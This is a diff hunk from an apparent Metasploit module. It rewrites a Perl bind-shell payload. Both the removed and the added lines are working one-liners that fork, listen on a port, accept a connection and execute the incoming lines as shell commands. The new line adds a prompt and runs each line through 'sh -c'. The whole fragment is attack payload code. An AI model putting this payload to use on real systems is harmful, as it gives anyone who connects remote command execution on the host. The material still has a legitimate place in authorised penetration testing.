@@ -52,7 +52,7 @@ module Metasploit3
 	#
 	def command_string
 
-		cmd = "perl -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"
+		cmd = "perl -MIO -e '$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept;print $c "\$ ";while (<$c>) { chop $_;chop $_; print $c `sh -c $_ 2>&1`."\$ "; }'"
 
 		return cmd
 	end
